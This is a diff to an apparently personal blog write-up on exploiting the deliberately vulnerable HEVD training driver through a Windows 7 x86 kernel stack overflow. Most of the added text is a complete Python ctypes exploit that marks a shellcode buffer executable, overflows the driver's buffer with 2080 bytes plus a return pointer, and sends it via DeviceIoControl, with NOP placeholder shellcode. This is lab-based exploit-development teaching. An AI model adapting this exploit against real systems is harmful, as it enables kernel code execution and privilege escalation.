@@ -1,6 +1,6 @@
 ---
 layout: single
-title: HEVD Exploits -- Stack Overflow
+title: HEVD Exploits -- Windows 7 x86 Stack Overflow
 date: 2020-01-20
 classes: wide
 header:
@@ -275,3 +275,83 @@ result = kernel32.VirtualProtect(
     )
 ```
 
+`c_int` and `c_ulong` are the `ctype` functions to declare variables of those C data types. `byref()` will return a pointer (vs. a value as in `byval()`) to the variable that is its parameter. The return value of the API is that if it's non-zero, it worked. 
+
+Finally, we'll use `struct.pack("<L",ptr)` to format the pointer appropriately so that it can be concatenated with our shellcode bytearray. At this point our complete code looks like this:
+```python
+import ctypes, sys, struct
+from ctypes import *
+from subprocess import *
+import time
+
+kernel32 = windll.kernel32
+
+def create_file():
+
+    hevd = kernel32.CreateFileA(
+        "\\\\.\\HackSysExtremeVulnerableDriver", 
+        0xC0000000, 
+        0, 
+        None, 
+        0x3, 
+        0, 
+        None)
+    
+    if (not hevd) or (hevd == -1):
+        print("[!] Failed to retrieve handle to device-driver with error-code: " + str(GetLastError()))
+        sys.exit(1)
+    else:
+        print("[*] Successfully retrieved handle to device-driver: " + str(hevd))
+        return hevd
+
+def send_buf(hevd):
+
+    shellcode = bytearray(
+    "\x90" * 100
+    )
+
+    print("[*] Allocating shellcode character array...")
+    usermode_addr = (c_char * len(shellcode)).from_buffer(shellcode)
+    ptr = addressof(usermode_addr)
+
+    print("[*] Marking shellcode RWX...")
+    
+    result = kernel32.VirtualProtect(
+        usermode_addr,
+        c_int(len(shellcode)),
+        c_int(0x40),
+        byref(c_ulong())
+    )
+
+    if result != 0:
+        print("[*] Successfully marked shellcode RWX.")
+    else:
+        print("[!] Failed to mark shellcode RWX.")
+        sys.exit(1)
+
+    payload = struct.pack("<L",ptr)
+
+    buf = "A" * 2080 + payload
+    buf_length = len(buf)
+    
+    print("[*] Sending payload to driver...")
+    result = kernel32.DeviceIoControl(
+        hevd,
+        0x222003,
+        buf,
+        buf_length,
+        None,
+        0,
+        byref(c_ulong()),
+        None
+    )
+
+hevd = create_file()
+send_buf(hevd)
+```
+
+Since our shellcode is just NOPs and we have our offset and EIP overwrite correct, this should just pass through execution and return back to the kernel and everything will be fine. If we get a crash here, something is wrong. A crash here means we corrupted some memory and didn't change it back to what it was supposed to be. Let's send this.
+
+Not that I know what I'm doing, but I always resend those WinDBG commands each session. Just FYI.
+
+![](/assets/images/AWE/crash3.PNG)
